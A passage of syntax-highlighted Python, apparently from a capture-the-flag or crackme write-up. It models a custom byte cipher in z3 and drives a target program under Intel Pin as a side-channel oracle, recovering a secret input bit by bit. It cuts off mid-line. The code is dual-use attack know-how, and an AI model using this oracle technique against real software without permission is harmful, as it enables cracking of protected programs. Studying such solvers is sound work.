class="keyword">return</span> To</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">L_z</span>(<span class="params">s</span>):</span><br><span class="line">    out = [<span class="literal">None</span>] * <span class="number">8</span></span><br><span class="line">    out[<span class="number">0</span>] = A_z(s[<span class="number">0</span>]) ^ C_z(s[<span class="number">2</span>]) ^ B_z(s[<span class="number">3</span>]) ^ D_z(s[<span class="number">5</span>])</span><br><span class="line">    out[<span class="number">1</span>] = B_z(s[<span class="number">0</span>]) ^ A_z(s[<span class="number">1</span>]) ^ C_z(s[<span class="number">3</span>]) ^ D_z(s[<span class="number">6</span>])</span><br><span class="line">    out[<span class="number">2</span>] = C_z(s[<span class="number">0</span>]) ^ B_z(s[<span class="number">1</span>]) ^ A_z(s[<span class="number">2</span>]) ^ D_z(s[<span class="number">7</span>])</span><br><span class="line">    out[<span class="number">3</span>] = C_z(s[<span class="number">1</span>]) ^ B_z(s[<span class="number">2</span>]) ^ A_z(s[<span class="number">3</span>]) ^ D_z(s[<span class="number">4</span>])</span><br><span class="line">    out[<span class="number">4</span>] = D_z(s[<span class="number">1</span>]) ^ E_z(s[<span class="number">4</span>]) ^ C_z(s[<span class="number">6</span>]) ^ B_z(s[<span class="number">7</span>])</span><br><span class="line">    out[<span class="number">5</span>] = D_z(s[<span class="number">2</span>]) ^ B_z(s[<span class="number">4</span>]) ^ E_z(s[<span class="number">5</span>]) ^ C_z(s[<span class="number">7</span>])</span><br><span class="line">    out[<span class="number">6</span>] = D_z(s[<span class="number">3</span>]) ^ C_z(s[<span class="number">4</span>]) ^ B_z(s[<span class="number">5</span>]) ^ E_z(s[<span class="number">6</span>])</span><br><span class="line">    out[<span class="number">7</span>] = D_z(s[<span class="number">0</span>]) ^ C_z(s[<span class="number">5</span>]) ^ B_z(s[<span class="number">6</span>]) ^ E_z(s[<span class="number">7</span>])</span><br><span class="line">    <span class="keyword">return</span> [x &amp; bv8(<span class="number">0xFF</span>) <span class="keyword">for</span> x <span class="keyword">in</span> out]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ENC8_z</span>(<span class="params">state8</span>):</span><br><span class="line">    lin = L_z(state8)</span><br><span class="line">    t = T_z(state8)</span><br><span class="line">    out = [(lin[i] ^ bv8(K0[i]) ^ t[i]) &amp; bv8(<span class="number">0xFF</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>)]</span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_solver</span>(<span class="params"></span></span><br><span class="line"><span class="params">    fixed_bits: <span class="type">Dict</span>[<span class="type">Tuple</span>[<span class="built_in">int</span>, <span class="built_in">int</span>], <span class="built_in">int</span>],</span></span><br><span class="line"><span class="params">    forbid_zero_input: <span class="built_in">bool</span>,</span></span><br><span class="line"><span class="params">    printable_only: <span class="built_in">bool</span> = <span class="literal">True</span>,</span></span><br><span class="line"><span class="params">    printable_min: <span class="built_in">int</span> = <span class="number">0x20</span>,</span></span><br><span class="line"><span class="params">    printable_max: <span class="built_in">int</span> = <span class="number">0x7E</span>,</span></span><br><span class="line"><span class="params">    allowed_charset: <span class="type">Optional</span>[<span class="built_in">bytes</span>] = <span class="literal">None</span></span>):</span><br><span class="line">    s = Solver()</span><br><span class="line">    x = [BitVec(<span class="string">f&quot;x<span class="subst">&#123;i&#125;</span>&quot;</span>, <span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(TOTAL_BYTES)]</span><br><span class="line">    <span class="keyword">if</span> forbid_zero_input:</span><br><span class="line">        <span class="keyword">for</span> xi <span class="keyword">in</span> x: s.add(xi != bv8(<span class="number">0</span>))</span><br><span class="line">    <span class="keyword">if</span> allowed_charset <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        cs = <span class="built_in">sorted</span>(<span class="built_in">set</span>(<span class="built_in">int</span>(c) &amp; <span class="number">0xFF</span> <span class="keyword">for</span> c <span class="keyword">in</span> allowed_charset))</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> cs: <span class="keyword">raise</span> ValueError(<span class="string">&quot;allowed_charset cannot be empty&quot;</span>)</span><br><span class="line">        choices = [bv8(c) <span class="keyword">for</span> c <span class="keyword">in</span> cs]</span><br><span class="line">        <span class="keyword">for</span> xi <span class="keyword">in</span> x: s.add(Or(*[xi == c <span class="keyword">for</span> c <span class="keyword">in</span> choices]))</span><br><span class="line">    <span class="keyword">elif</span> printable_only:</span><br><span class="line">        lo = printable_min &amp; <span class="number">0xFF</span></span><br><span class="line">        hi = printable_max &amp; <span class="number">0xFF</span></span><br><span class="line">        <span class="keyword">for</span> xi <span class="keyword">in</span> x:</span><br><span class="line">            s.add(UGE(xi, bv8(lo)))</span><br><span class="line">            s.add(ULT(xi, bv8(hi + <span class="number">1</span>)))</span><br><span class="line">    y_blocks = []</span><br><span class="line">    <span class="keyword">for</span> q <span class="keyword">in</span> <span class="built_in">range</span>(N_QWORDS):</span><br><span class="line">        st = x[q * <span class="number">8</span>:(q + <span class="number">1</span>) * <span class="number">8</span>]</span><br><span class="line">        y_blocks.append(ENC8_z(st))</span><br><span class="line">    <span class="keyword">for</span> (q, bit), v <span class="keyword">in</span> fixed_bits.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> (<span class="number">0</span> &lt;= q &lt; N_QWORDS <span class="keyword">and</span> <span class="number">0</span> &lt;= bit &lt; <span class="number">64</span>):</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">f&quot;invalid key <span class="subst">&#123;(q, bit)&#125;</span>&quot;</span>)</span><br><span class="line">        byte_i = bit // <span class="number">8</span></span><br><span class="line">        bit_i = bit % <span class="number">8</span></span><br><span class="line">        b = Extract(bit_i, bit_i, y_blocks[q][byte_i])</span><br><span class="line">        s.add(b == BitVecVal(<span class="built_in">int</span>(v), <span class="number">1</span>))</span><br><span class="line">    <span class="keyword">return</span> s, x, y_blocks</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">model_eval_u8</span>(<span class="params">m, exprs</span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    out = <span class="built_in">bytearray</span>()</span><br><span class="line">    <span class="keyword">for</span> e <span class="keyword">in</span> exprs: out.append(<span class="built_in">int</span>(m.<span class="built_in">eval</span>(e, model_completion=<span class="literal">True</span>).as_long()) &amp; <span class="number">0xFF</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(out)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_one_input</span>(<span class="params">fixed_bits: <span class="type">Dict</span>[<span class="type">Tuple</span>[<span class="built_in">int</span>, <span class="built_in">int</span>], <span class="built_in">int</span>], forbid_zero_input: <span class="built_in">bool</span> = <span class="literal">True</span>, printable_only: <span class="built_in">bool</span> = <span class="literal">True</span>, printable_min: <span class="built_in">int</span> = <span class="number">0x20</span>, printable_max: <span class="built_in">int</span> = <span class="number">0x7E</span>, allowed_charset: <span class="type">Optional</span>[<span class="built_in">bytes</span>] = <span class="literal">None</span></span>) -&gt; <span class="type">Optional</span>[<span class="type">Tuple</span>[<span class="built_in">bytes</span>, <span class="built_in">bytes</span>]]:</span><br><span class="line">    s, x, y_blocks = build_solver(</span><br><span class="line">        fixed_bits,</span><br><span class="line">        forbid_zero_input=forbid_zero_input,</span><br><span class="line">        printable_only=printable_only,</span><br><span class="line">        printable_min=printable_min,</span><br><span class="line">        printable_max=printable_max,</span><br><span class="line">        allowed_charset=allowed_charset)</span><br><span class="line">    <span class="keyword">if</span> s.check() != sat: <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    m = s.model()</span><br><span class="line">    inp = model_eval_u8(m, x)</span><br><span class="line">    enc = <span class="built_in">bytearray</span>()</span><br><span class="line">    <span class="keyword">for</span> q <span class="keyword">in</span> <span class="built_in">range</span>(N_QWORDS): enc.extend(model_eval_u8(m, y_blocks[q]))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(inp), <span class="built_in">bytes</span>(enc)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">qword_plain_uniqueness</span>(<span class="params">fixed_bits: <span class="type">Dict</span>[<span class="type">Tuple</span>[<span class="built_in">int</span>, <span class="built_in">int</span>], <span class="built_in">int</span>], q: <span class="built_in">int</span>, forbid_zero_input: <span class="built_in">bool</span> = <span class="literal">True</span>, printable_only: <span class="built_in">bool</span> = <span class="literal">True</span>, printable_min: <span class="built_in">int</span> = <span class="number">0x20</span>, printable_max: <span class="built_in">int</span> = <span class="number">0x7E</span>, allowed_charset: <span class="type">Optional</span>[<span class="built_in">bytes</span>] = <span class="literal">None</span></span>):</span><br><span class="line">    s, x, _ = build_solver(</span><br><span class="line">        fixed_bits,</span><br><span class="line">        forbid_zero_input=forbid_zero_input,</span><br><span class="line">        printable_only=printable_only,</span><br><span class="line">        printable_min=printable_min,</span><br><span class="line">        printable_max=printable_max,</span><br><span class="line">        allowed_charset=allowed_charset)</span><br><span class="line">    <span class="keyword">if</span> s.check() != sat: <span class="keyword">return</span> <span class="literal">False</span>, <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line">    m1 = s.model()</span><br><span class="line">    off = q * <span class="number">8</span></span><br><span class="line">    v1 = [<span class="built_in">int</span>(m1.<span class="built_in">eval</span>(x[off + i], model_completion=<span class="literal">True</span>).as_long()) &amp; <span class="number">0xFF</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>)]</span><br><span class="line">    v1_hex = <span class="built_in">bytes</span>(v1).<span class="built_in">hex</span>()</span><br><span class="line">    s.add(Or(*[(x[off + i] != bv8(v1[i])) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>)]))</span><br><span class="line">    <span class="keyword">if</span> s.check() == sat:</span><br><span class="line">        m2 = s.model()</span><br><span class="line">        v2 = [<span class="built_in">int</span>(m2.<span class="built_in">eval</span>(x[off + i], model_completion=<span class="literal">True</span>).as_long()) &amp; <span class="number">0xFF</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>)]</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>, v1_hex, <span class="built_in">bytes</span>(v2).<span class="built_in">hex</span>()</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span>, v1_hex, <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ShrOracle</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params"></span></span><br><span class="line"><span class="params">        self,</span></span><br><span class="line"><span class="params">        workdir: Path,</span></span><br><span class="line"><span class="params">        pin_cmd: <span class="type">List</span>[<span class="built_in">str</span>],</span></span><br><span class="line"><span class="params">        input_file: <span class="built_in">str</span>,</span></span><br><span class="line"><span class="params">        shr_file: <span class="built_in">str</span>,</span></span><br><span class="line"><span class="params">        timeout_sec: <span class="built_in">float</span> = <span class="number">15.0</span>,</span></span><br><span class="line"><span class="params">        retries: <span class="built_in">int</span> = <span class="number">2</span>,</span></span><br><span class="line"><span class="params">        samples: <span class="built_in">int</span> = <span class="number">1</span></span>):</span><br><span class="line">        <span class="variable language_">self</span>.workdir = Path(workdir)</span><br><span class="line">        <span class="variable language_">self</span>.pin_cmd = pin_cmd</span><br><span class="line">        <span class="variable language_">self</span>.input_file = input_file</span><br><span class="line">        <span class="variable language_">self</span>.shr_file = shr_file</span><br><span class="line">        <span class="variable language_">self</span>.timeout_sec = timeout_sec</span><br><span class="line">        <span class="variable language_">self</span>.retries = retries</span><br><span class="line">        <span class="variable language_">self</span>.samples = <span class="built_in">max</span>(<span class="number">1</span>, <span class="built_in">int</span>(samples))</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">parse_int</span>(<span class="params">text: <span class="built_in">str</span></span>) -&gt; <span class="type">Optional</span>[<span class="built_in">int</span>]:</span><br><span class="line">        m = re.search(<span class="string">r&quot;-?\d+&quot;</span>, text)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> m: <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">int</span>(m.group(<span class="number">0</span>))</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run_once</span>(<span class="params">self, inp32: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        in_path = <span class="variable language_">self</span>.workdir / <span class="variable language_">self</span>.input_file</span><br><span class="line">        shr_path = <span class="variable language_">self</span>.workdir / <span class="variable language_">self</span>.shr_file</span><br><span class="line">        in_path.write_bytes(inp32)</span><br><span class="line">        <span class="keyword">if</span> shr_path.exists():</span><br><span class="line">            shr_path.unlink()</span><br><span class="line">        subprocess.run(</span><br><span class="line">            <span class="variable language_">self</span>.pin_cmd,</span><br><span class="line">            cwd=<span class="built_in">str</span>(<span class="variable language_">self</span>.workdir),</span><br><span class="line">            stdout=subprocess.DEVNULL,</span><br><span class="line">            stderr=subprocess.DEVNULL,</span><br><span class="line">            check=<span class="literal">False</span>)</span><br><span class="line">        t0 = time.time()</span><br><span class="line">        <span class="keyword">while</span> time.time() - t0 &lt; <span class="variable language_">self</span>.timeout_sec:</span><br><span class="line">            <span class="keyword">if</span> shr_path.exists():</span><br><span class="line">                txt = shr_path.read_text(encoding=<span class="string">&quot;utf-8&quot;</span>, errors=<span class="string">&quot;ignore&quot;</span>).strip()</span><br><span class="line">                <span class="keyword">if</span> txt:</span><br><span class="line">                    v = <span class="variable language_">self</span>.parse_int(txt)</span><br><span class="line">                    <span class="keyword">if</span> v <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>: <span class="keyword">return</span> v</span><br><span class="line">            time.sleep(<span class="number">0.03</span>)</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">f&quot;Read shr file timeout&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">query</span>(<span class="params">self, inp32: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        best = <span class="literal">None</span></span><br><span class="line">        last_err = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="variable language_">self</span>.samples):</span><br><span class="line">            ok = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="variable language_">self</span>.retries + <span class="number">1</span>):</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    v = <span class="variable language_">self</span>.run_once(inp32)</span><br><span class="line">                    best = v <span class="keyword">if</span> best <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">else</span> <span class="built_in">max</span>(best, v)</span><br><span class="line">                    ok = <span class="literal">True</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">except</span> Exception <span class="keyword">as</span> e: last_err = e</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> ok: <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">if</span> best <span class="keyword">is</span> <span class="literal">None</span>: <span class="keyword">raise</span> RuntimeError(<span class="string">f&quot;oracle failed: <span class="subst">&#123;last_err&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> best</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gbit_to_qb</span>(<span class="params">g: <span class="built_in">int</span></span>) -&gt; <span class="type">Tuple</span>[<span class="built_in">int</span>, <span class="built_in">int</span>]: <span class="keyword">return</span> g // <span class="number">64</span>, g % <span class="number">64</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">qb_to_gbit</span>(<span class="params">q: <span class="built_in">int</span>, b: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>: <span class="keyword">return</span> q * <span class="number">64</span> + b</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enc_bit</span>(<span class="params">enc32: <span class="built_in">bytes</span>, g: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    byte_i = g // <span class="number">8</span></span><br><span class="line">    bit_i = g % <span class="number">8</span></span><br><span class="line">    <span class="keyword">return</span> (enc32[byte_i] &gt;&gt; bit_i) &amp; <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fixed_to_global_map</span>(<span class="params">fixed_bits: <span class="type">Dict</span>[<span class="type">Tuple</span>[<span class="built_in">int</span>, <span class="built_in">int</span>], <span class="built_in">int</span>]</span>) -&gt; <span class="type">Dict</span>[<span class="built_in">int</span>, <span class="built_in">int</span>]:</span><br><span class="line">    out = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> (q, b), v <span class="keyword">in</span> fixed_bits.items(): out[qb_to_gbit(q, b)] = <span class="built_in">int</span>(v)</span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fixed_cipher_hex32</span>(<span class="params">fixed_bits: <span class="type">Dict</span>[<span class="type">Tuple</span>[<span class="built_in">int</span>, <span class="built_in">int</span>], <span class="built_in">int</span>]</span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    b = <span class="built_in">bytearray</span>(TOTAL_BYTES)</span><br><span class="line">    <span class="keyword">for</span> (q, bit), v <span class="keyword">in</span> fixed_bits.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">int</span>(v) == <span class="number">1</span>:</span><br><span class="line">            idx = q * <span class="number">8</span> + (bit // <span class="number">8</span>)</span><br><span class="line">            b[idx] |= (<span class="number">1</span> &lt;&lt; (bit % <span class="number">8</span>))</span><br><span class="line">    <span class="keyword">return</span> b.<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clear_qword_bits</span>(<span class="params">fixed_bits: <span class="type">Dict</span>[<span class="type">Tuple</span>[<span class="built_in">int</span>, <span class="built_in">int</span>], <span class="built_in">int</span>], q: <span class="built_in">int</span></span>):</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>): fixed_bits.pop((q, b), <span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clear_from_qword</span>(<span class="params">fixed_bits: <span class="type">Dict</span>[<span class="type">Tuple</span>[<span class="built_in">int</span>, <span class="built_in">int</span>], <span class="built_in">int</span>], q: <span class="built_in">int</span></span>):</span><br><span class="line">    <span class="keyword">for</span> qq <span class="keyword">in</span> <span class="built_in">range</span>(q, N_QWORDS): clear_qword_bits(fixed_bits, qq)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">absorb_by_score</span>(<span class="params">fixed_bits: <span class="type">Dict</span>[<span class="type">Tuple</span>[<span class="built_in">int</span>, <span class="built_in">int</span>], <span class="built_in">int</span>], enc32: <span class="built_in">bytes</span>, score: <span class="built_in">int</span></span>):</span><br><span class="line">    newly = []</span><br><span class="line">    conflict = <span class="literal">None</span></span><br><span class="line">    upto = <span class="built_in">min</span>(<span class="built_in">max</span>(<span class="built_in">int</span>(score), <span class="number">0</span>), TOTAL_BITS)</span><br><span class="line">    <span class="keyword">for</span> g <span class="keyword">in</span> <span class="built_in">range</span>(upto):</span><br><span class="line">        q, b = gbit_to_qb(g)</span><br><span class="line">        bitv = enc_bit(enc32, g)</span><br><span class="line">        key = (q, b)</span><br><span class="line">        <span class="keyword">if</span> key <span class="keyword">in</span> fixed_bits:</span><br><span class="line">            <span class="keyword">if</span> fixed_bits[key] != bitv:</span><br><span class="line">                conflict = &#123;<span class="string">&quot;gbit&quot;</span>: g, <span class="string">&quot;q&quot;</span>: q, <span class="string">&quot;bit&quot;</span>: b, <span class="string">&quot;old&quot;</span>: fixed_bits[key], <span class="string">&quot;new&quot;</span>: bitv&#125;</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            fixed_bits[key] = bitv</span><br><span class="line">            newly.append((q, b, bitv))</span><br><span class="line">    <span class="keyword">return</span> newly, conflict</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">save_ckpt</span>(<span class="params">path: Path, data: <span class="type">Dict</span>[<span class="built_in">str</span>, <span class="type">Any</span>]</span>): path.write_text(json.dumps(data, ensure_ascii=<span class="literal">False</span>, indent=<span class="number">2</span>), encoding=<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_ckpt</span>(<span class="params">path: Path</span>) -&gt; <span class="type">Optional</span>[<span class="type">Dict</span>[<span class="built_in">str</span>, <span class="type">Any</span>]]:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> path.exists(): <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">return</span> json.loads(path.read_text(encoding=<span class="string">&quot;utf-8&quot;</span>, errors=<span class="string">&quot;ignore&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode_fixed_bits</span>(<span class="params">fixed_bits: <span class="type">Dict</span>[<span class="type">Tuple</span>[<span class="built_in">int</span>, <span class="built_in">int</span>], <span class="built_in">int</span>]</span>) -&gt; <span class="type">List</span>[<span class="type">Dict</span>[<span class="built_in">str</span>, <span class="built_in">int</span>]]:</span><br><span class="line">    arr = []</span><br><span class="line">    <span class="keyword">for</span> (q, b), v <span class="keyword">in</span> <span class="built_in">sorted</span>(fixed_bits.items()): arr.append(&#123;<span class="string">&quot;q&quot;</span>: q, <span class="string">&quot;bit&quot;</span>: b, <span class="string">&quot;v&quot;</span>: <span class="built_in">int</span>(v)&#125;)</span><br><span class="line">    <span class="keyword">return</span> arr</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode_fixed_bits</span>(<span class="params">arr: <span class="type">List</span>[<span class="type">Dict</span>[<span class="built_in">str</span>, <span class="built_in">int</span>]]</span>) -&gt; <span class="type">Dict</span>[<span class="type">Tuple</span>[<span class="built_in">int</span>, <span class="built_in">int</span>], <span class="built_in">int</span>]:</span><br><span class="line">    out = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> it <span class="keyword">in</span> arr: out[(<span class="built_in">int</span>(it[<span class="string">&quot;q&quot;</span>]), <span class="built_in">int</span>(it[<span class="string">&quot;bit&quot;</span>]))] = <span class="built_in">int</span>(it[<span class="string">&quot;v&quot;</span>])</span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">args</span>):</span><br><span class="line">    workdir = Path(args.workdir).resolve()</span><br><span class="line">    ckpt_path = workdir / args.ckpt</span><br><span class="line">    result_path = workdir / args.result_json</span><br><span class="line">    pin_cmd = [args.pin, <span class="string">&quot;-t&quot;</span>, args.tool]</span><br><span class="line">    <span class="keyword">if</span> args.tool_out_knob: pin_cmd += [<span class="string">&quot;-o&quot;</span>, args.shr_file]</span><br><span class="line">    pin_cmd += [<span class="string">&quot;--&quot;</span>, args.app]</span><br><span class="line">    oracle = ShrOracle(</span><br><span class="line">        workdir=workdir,</span><br><span class="line">        pin_cmd=pin_cmd,</span><br><span class="line">        input_file=args.input_file,</span><br><span class="line">        shr_file=args.shr_file,</span><br><span class="line">        timeout_sec=args.timeout,</span><br><span class="line">        retries=args.oracle_retries,</span><br><span class="line">        samples=args.oracle_samples)</span><br><span class="line">    printable_only = <span class="built_in">bool</span>(<span class="built_in">getattr</span>(args, <span class="string">&quot;printable_only&quot;</span>, <span class="literal">True</span>))</span><br><span class="line">    printable_min = <span class="built_in">int</span>(<span class="built_in">getattr</span>(args, <span class="string">&quot;printable_min&quot;</span>, <span class="number">0x20</span>))</span><br><span class="line">    printable_max = <span class="built_in">int</span>(<span class="built_in">getattr</span>(args, <span class="string">&quot;printable_max&quot;</span>, <span class="number">0x7E</span>))</span><br><span class="line">    allowed_charset = <span class="built_in">getattr</span>(args, <span class="string">&quot;allowed_charset&quot;</span>, <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(allowed_charset, <span class="built_in">str</span>): allowed_charset = allowed_charset.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    fixed_bits: <span class="type">Dict</span>[<span class="type">Tuple</span>[<span class="built_in">int</span>, <span class="built_in">int</span>], <span class="built_in">int</span>] = &#123;&#125;</span><br><span class="line">    current_q = <span class="number">0</span></span><br><span class="line">    bit63_ambiguous: <span class="type">Dict</span>[<span class="built_in">int</span>, <span class="built_in">bool</span>] = &#123;&#125;</span><br><span class="line">    probe_cache: <span class="type">Dict</span>[<span class="type">Tuple</span>[<span class="type">Tuple</span>[<span class="built_in">int</span>, <span class="built_in">int</span>, <span class="built_in">int</span>], ...], <span class="type">Tuple</span>[<span class="type">Optional</span>[<span class="built_in">int</span>], <span class="type">Optional</span>[<span class="built_in">str</span>], <span class="type">Optional</span>[<span class="built_in">str</span>], <span class="built_in">str</span>]] = &#123;&#125;</span><br><span class="line">    <span class="keyword">if</span> args.resume <span class="keyword">and</span> ckpt_path.exists():</span><br><span class="line">        ck = load_ckpt(ckpt_path)</span><br><span class="line">        fixed_bits = decode_fixed_bits(ck.get(<span class="string">&quot;fixed_bits&quot;</span>, []))</span><br><span class="line">        current_q = <span class="built_in">int</span>(ck.get(<span class="string">&quot;current_q&quot;</span>, <span class="number">0</span>))</span><br><span class="line">        bit63_ambiguous = &#123;<span class="built_in">int</span>(q): <span class="literal">True</span> <span class="keyword">for</span> q <span class="keyword">in</span> ck.get(<span class="string">&quot;bit63_ambiguous&quot;</span>, [])&#125;</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] recover from checkpoint: q=<span class="subst">&#123;current_q&#125;</span>, fixed_bits=<span class="subst">&#123;<span class="built_in">len</span>(fixed_bits)&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>: <span class="built_in">print</span>(<span class="string">&quot;[+] start&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">cache_key</span>(<span class="params">fb: <span class="type">Dict</span>[<span class="type">Tuple</span>[<span class="built_in">int</span>, <span class="built_in">int</span>], <span class="built_in">int</span>]</span>): <span class="keyword">return</span> <span class="built_in">tuple</span>(<span class="built_in">sorted</span>((q, b, <span class="built_in">int</span>(v)) <span class="keyword">for</span> (q, b), v <span class="keyword">in</span> fb.items()))</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">solve_sat_only</span>(<span class="params">fb: <span class="type">Dict</span>[<span class="type">Tuple</span>[<span class="built_in">int</span>, <span class="built_in">int</span>], <span class="built_in">int</span>]</span>):</span><br><span class="line">        <span class="keyword">return</span> solve_one_input(</span><br><span class="line">            fb,</span><br><span class="line">            forbid_zero_input=(<span class="keyword">not</span> args.allow_zero_input),</span><br><span class="line">            printable_only=printable_only,</span><br><span class="line">            printable_min=printable_min,</span><br><span class="line">            printable_max=printable_max,</span><br><span class="line">            allowed_charset=allowed_charset)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">probe</span>(<span class="params">fb: <span class="type">Dict</span>[<span class="type">Tuple</span>[<span class="built_in">int</span>, <span class="built_in">int</span>], <span class="built_in">int</span>]</span>):</span><br><span class="line">        k = cache_key(fb)</span><br><span class="line">        <span class="keyword">if</span> k <span class="keyword">in</span> probe_cache: <span class="keyword">return</span> probe_cache[k]</span><br><span class="line">        sat_one = solve_sat_only(fb)</span><br><span class="line">        <span class="keyword">if</span> sat_one <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            probe_cache[k] = (<span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="string">&quot;unsat&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> probe_cache[k]</span><br><span class="line">        inp32, enc32 = sat_one</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            sc = oracle.query(inp32)</span><br><span class="line">            probe_cache[k] = (sc, inp32.<span class="built_in">hex</span>(), enc32.<span class="built_in">hex</span>(), <span class="string">&quot;ok&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e: probe_cache[k] = (<span class="literal">None</span>, inp32.<span class="built_in">hex</span>(), enc32.<span class="built_in">hex</span>(), <span class="string">f&quot;oracle_error:<span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> probe_cache[k]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">is_sat_status</span>(<span class="params">st: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>: <span class="keyword">return</span> st != <span class="string">&quot;unsat&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">dump_ckpt</span>(<span class="params">note: <span class="built_in">str</span></span>):</span><br><span class="line">        obj = &#123;</span><br><span class="line">            <span class="string">&quot;note&quot;</span>: note,</span><br><span class="line">            <span class="string">&quot;current_q&quot;</span>: current_q,</span><br><span class="line">            <span class="string">&quot;fixed_bits_count&quot;</span>: <span class="built_in">len</span>(fixed_bits),</span><br><span class="line">            <span class="string">&quot;fixed_bits&quot;</span>: encode_fixed_bits(fixed_bits),</span><br><span class="line">            <span class="string">&quot;bit63_ambiguous&quot;</span>: <span 